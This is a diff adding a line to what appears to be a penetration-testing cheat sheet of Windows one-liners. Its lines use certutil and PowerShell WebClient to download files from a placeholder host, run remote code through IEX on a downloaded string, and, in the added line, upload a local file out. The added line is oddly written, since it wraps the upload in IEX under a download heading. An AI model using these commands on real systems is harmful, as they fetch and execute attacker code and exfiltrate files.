@@ -1428,6 +1428,7 @@ certutil -split -f -urlcache http://{IP ADDRESS}/{FILE}
 
 # Windows - Download file using powershell
 IEX(new-object System.Net.WebClient).DownloadFile('http://{IP ADDRESS}/{FILE.exe}','C:\Users\{USER}\{FILE.exe}')
+IEX(new-object System.Net.WebClient).UploadFile('http://{IP ADDRESS}/{FILE.exe}','C:\Users\{USER}\{FILE.exe}')
 
 # Windows - Load a string file and execute in powershell:
 IEX(New-Object Net.WebClient).downloadstring("http://{IP ADDRESS}/{FILE}")
